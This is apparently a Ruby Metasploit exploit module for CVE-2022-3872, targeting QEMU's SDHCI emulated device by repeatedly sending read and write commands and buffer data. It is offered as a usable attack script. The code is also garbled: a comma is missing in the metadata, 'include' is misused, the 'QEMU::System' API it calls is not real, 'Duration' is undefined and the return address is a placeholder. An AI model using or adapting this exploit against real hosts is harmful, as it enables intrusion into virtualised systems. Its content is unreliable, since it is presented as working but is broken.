##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit

  Rank = LowRanking

  include Msf::Exploit

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2022-3872 Linux Target',
      'Description'    => %q{
        Exploits CVE-2022-3872 on a Linux target by reading and writing to the SDHCI device of QEMU
      },
      'Author'         => [
        'Xavier John Anderson <xavianderson2@gmail.com>'
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', 'CVE-2022-3872' ],
        [ 'URL', 'https://www.cvedetails.com/cve/CVE-2022-3872/' ]
      ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        => [
        [ 'QEMU 1.5.0', { 'Ret' => 0xdeadbeef } ]
      ],
      'DisclosureDate' => '2022-11-07'
      'DefaultOptions' =>
        {
          'Duration' => 1234
        }
    ))
  end

  def exploit
    include 'qemu'
    qemu = QEMU::System.new('sdhci')

    # Construct a read request with data_count equal to block_size
    data_count = 512
    block_size = 512
    for i in 0..Duration
      # Read the data from the buffer data port
      command = [0x10, (data_count >> 0) & 0xff, (data_count >> 8) & 0xff, 0, 0, 0, 0, 0, 0, 0]
      response = qemu.send_command(command)
      data = qemu.read_buffer_data_port(block_size)
      # Write data to the buffer data port
      command = [0x18, (data_count >> 0) & 0xff, (data_count >> 8) & 0xff, 0, 0, 0, 0, 0, 0, 0]
      qemu.send_command(command)
      data = 'A' * block_size
      qemu.write_buffer_data_port(data)
    end
  end
end
